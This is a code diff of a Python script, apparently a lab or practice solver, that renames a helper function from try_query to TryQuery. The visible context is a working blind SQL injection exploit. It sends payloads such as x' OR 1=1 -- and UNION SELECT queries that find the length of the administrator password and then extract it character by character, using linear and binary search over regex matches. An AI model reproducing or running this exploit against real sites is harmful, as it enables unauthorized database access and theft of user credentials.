@@ -33,7 +33,7 @@ def IsValid(resp):
     else:
         return False
 
-def try_query(query):
+def TryQuery(query):
     """
     Runs query on site for accuracy.
     Performs/Parses the data returned to determine if the request is valid
@@ -67,15 +67,15 @@ def DetermineLength():
         none
     """
     #Tests the query fucntion
-    try_query("""x' OR 1=1 --""")
-    try_query("""x" OR 1=1 --""")
+    TryQuery("""x' OR 1=1 --""")
+    TryQuery("""x" OR 1=1 --""")
 
     begin_time = time.perf_counter()
     num = 1
     while True:
         query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
         print(f'Trying length {num}')
-        if try_query(query) == False:
+        if TryQuery(query) == False:
             num = num + 1
         else:
             break
@@ -100,7 +100,7 @@ def LinearSearch(arr, password_length):
     """
     for i in range(len(characters)):
         query1 = f"{query_pass} ~ '^{characters[i]}'--"
-        if try_query(query1) == False:
+        if TryQuery(query1) == False:
             pass
         else:
             print(f"Password begins with {characters[i]}")
@@ -111,7 +111,7 @@ def LinearSearch(arr, password_length):
         #print(f"Current Portion of Password: {try_password[0]}")
         for i in range(len(characters)):
             query2 = f"{query_pass} ~ '^{try_password[0]+characters[i]}'--"
-            if try_query(query2) == False:
+            if TryQuery(query2) == False:
                 pass
             else:
                 print(f"Password starts with {try_password[0]+characters[i]}")
@@ -130,7 +130,7 @@ def GetMatch(try_password):
         True/False depending on if the query is correct    
     """ 
     query = f"{query_pass} ~ '^{try_password}$'--"
-    if try_query(query) == True:
+    if TryQuery(query) == True:
         print(f"Found pass: {try_password}")
         return True
     return False
@@ -160,7 +160,7 @@ def BinarySearchRec(try_pass, arr, high_point, low_point):
         else:
             query = f"{query_pass} ~ '^{arr[middle_point]}'--"
 
-        if try_query(query) == True:
+        if TryQuery(query) == True:
             return arr[middle_point]
         
         
@@ -171,7 +171,7 @@ def BinarySearchRec(try_pass, arr, high_point, low_point):
         
         #checks all the characters in password up to the middle point
         #then moves to lower point
-        if try_query(query) == True:
+        if TryQuery(query) == True:
             return BinarySearchRec(try_pass, arr, middle_point-1, low_point)
         else:
             return BinarySearchRec(try_pass, arr, high_point, middle_point+1)
